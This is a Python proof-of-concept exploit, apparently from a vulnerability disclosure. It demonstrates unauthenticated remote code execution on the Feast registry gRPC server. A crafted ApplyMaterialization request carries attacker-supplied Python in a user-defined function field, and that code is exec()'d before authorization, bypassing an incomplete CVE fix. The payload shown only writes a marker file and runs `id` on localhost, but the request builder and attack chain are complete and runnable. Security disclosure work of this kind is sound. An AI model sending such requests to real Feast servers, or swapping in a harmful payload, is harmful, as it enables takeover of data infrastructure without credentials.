#!/usr/bin/env python3
"""
PoC 3 — Unauthenticated RCE on the Feast registry server via ApplyMaterialization
(exec()/dill.loads on an attacker-supplied UDF, before authorization).

This is a SECOND, cleaner instance of the same incomplete-fix root cause as
PoC 1. Unlike the ValidationReference path, it needs only Feast's CORE
dependencies (no `great_expectations` extra): a plain FeatureView proto carrying
a `feature_transformation.user_defined_function` is enough.

Chain:
  ApplyMaterialization(request)                       # registry_server.py:1452
    -> FeatureView.from_proto(request.feature_view)   # NO skip_udf, evaluated as
                                                      #   the resource= argument,
                                                      #   BEFORE assert_permissions
      -> PythonTransformation.from_proto(udf_proto)   # feature_view.py
        -> resolve_udf(udf_string=body_text, body=body)   # udf_rehydrate.py
             exec(body_text)          # if body_text set  -> code execution
             dill.loads(body)         # else if body set  -> code execution

The ApplyFeatureView handler was fixed for CVE-2026-56121 by parsing a
metadata-only object with skip_udf=True before the permission check.
ApplyMaterialization (and ApplyValidationReference) never received that fix.

Local-only PoC. The payload writes a marker file and runs `id`. Nothing
external is touched.

Run:
    PYTHONPATH=<repo>/sdk/python  ./venv/bin/python poc_materialization_rce.py
"""

import os
import sys
import tempfile
import time
from concurrent import futures

import grpc

import feast  # noqa: F401  real HEAD source via PYTHONPATH
from feast.registry_server import RegistryServer, _grpc_interceptors
from feast.permissions.server.utils import AuthManagerType, str_to_auth_manager_type
from feast.protos.feast.registry import RegistryServer_pb2, RegistryServer_pb2_grpc
from feast.protos.feast.core.FeatureView_pb2 import (
    FeatureView as FeatureViewProto,
    FeatureViewSpec,
)
from feast.protos.feast.core.Transformation_pb2 import (
    FeatureTransformationV2,
    UserDefinedFunctionV2,
)

MARKER = os.path.join(tempfile.gettempdir(), f"feast_materialize_rce_{os.getpid()}")

# Attacker-controlled Python SOURCE. exec() runs the top-level statements.
MALICIOUS_BODY_TEXT = (
    "import os\n"
    f"os.system(\"echo '=== Feast ApplyMaterialization RCE (exec) ===' > {MARKER}; "
    f"id >> {MARKER}; echo server_pid=$$ >> {MARKER}\")\n"
    "def transform(df):\n"
    "    return df\n"
)


def build_request() -> RegistryServer_pb2.ApplyMaterializationRequest:
    udf = UserDefinedFunctionV2(
        name="transform",
        body_text=MALICIOUS_BODY_TEXT,  # exec() path (mode left empty)
        mode="",
    )
    spec = FeatureViewSpec(
        name="pwn",
        feature_transformation=FeatureTransformationV2(user_defined_function=udf),
    )
    fv = FeatureViewProto(spec=spec)
    return RegistryServer_pb2.ApplyMaterializationRequest(
        feature_view=fv, project="demo", commit=False
    )


class _DummyRegistry:
    def apply_materialization(self, *a, **k):
        raise AssertionError("must not be reached — exec fires during from_proto")


def main() -> int:
    print(f"[i] feast source under test: {feast.__file__}")
    auth_type = str_to_auth_manager_type("no_auth")
    assert auth_type == AuthManagerType.NONE
    interceptors = _grpc_interceptors(auth_type)
    print(f"[i] no_auth -> interceptors {[type(i).__name__ for i in interceptors]} "
          "(no AuthInterceptor)")

    server = grpc.server(
        futures.ThreadPoolExecutor(max_workers=4), interceptors=interceptors
    )
    RegistryServer_pb2_grpc.add_RegistryServerServicer_to_server(
        RegistryServer(_DummyRegistry(), store=None), server
    )
    port = server.add_insecure_port("127.0.0.1:0")
    server.start()
    print(f"[i] registry server on 127.0.0.1:{port} (insecure, unauthenticated)")

    if os.path.exists(MARKER):
        os.remove(MARKER)

    stub = RegistryServer_pb2_grpc.RegistryServerStub(
        grpc.insecure_channel(f"127.0.0.1:{port}")
    )
    print("[i] sending ApplyMaterialization with NO credentials ...")
    try:
        stub.ApplyMaterialization(build_request(), timeout=15)
        print("[i] RPC returned normally")
    except grpc.RpcError as e:
        print(f"[i] RPC raised {e.code()} (code already ran)")

    time.sleep(0.3)
    server.stop(0)

    if os.path.exists(MARKER):
        print("\n*** RCE CONFIRMED (core deps only, no great_expectations) ***\n")
        print(open(MARKER).read())
        return 0
    print("\n[x] no marker — not reproduced")
    return 1


if __name__ == "__main__":
    sys.exit(main())
